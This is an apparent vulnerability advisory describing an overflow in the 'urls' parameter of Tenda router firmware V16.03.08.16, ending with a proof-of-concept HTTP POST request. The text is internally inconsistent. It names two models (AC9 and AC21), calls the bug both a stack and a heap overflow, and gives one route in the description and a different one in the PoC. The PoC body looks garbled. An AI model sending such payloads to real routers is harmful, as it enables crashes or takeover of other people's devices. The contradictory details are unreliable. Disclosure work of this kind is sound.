# Tenda AC9 V16.03.08.16 stack overflow vulnerability
## Affected Version
Tenda AC21 V1.0 V16.03.08.16
## Vulnerability Description
In Tenda ac21 V1.0 routers with firmware version V16.03.08.16, the urls parameter of route /goform/fromSetWifiGusetBasic has a stack overflow vulnerability, which can lead to remote arbitrary code execution.
## Vulnerability Detail
There is a stack overflow vulnerability in the fromSetWifiGusetBasic function in Tenda AC21 V1.0 firmware V16.03.08.16. This function accepts the urls parameter from a Web request via the variable v8 within the sub-function get_parentControl_list_Info. However, since the user has full control over the input of urls, and strcpy() performs the copy operation without any boundary checks to ensure the source string does not exceed the remaining capacity of the target buffer, the statement strcpy((char *)(a2 + 80), v8); leads to a heap-based buffer overflow. The user-supplied urls string can exceed the space remaining in the a2 buffer (which corresponds to the ptr buffer allocated with only 0x254 bytes in the parent function), thereby corrupting adjacent heap memory and metadata. This vulnerability could be exploited to trigger a Denial of Service (DoS) or achieve Remote Code Execution (RCE).
![img](./img/saveParentControlInfo-urls.png)

## Poc
```py
POST /goform/saveParentControlInfo HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Cookie: password=452b97084f53fd461f33687a27a21f4dpxatgb

deviceId=43%3Ac8%3Aa1%3A49%3A7d%3A5e&deviceName=name&enable=1&time=10%3A00-12%3A00&url_enable=1&%2C1%2C1%2C1%2C1%2C1%2C1&limit_type=1
```
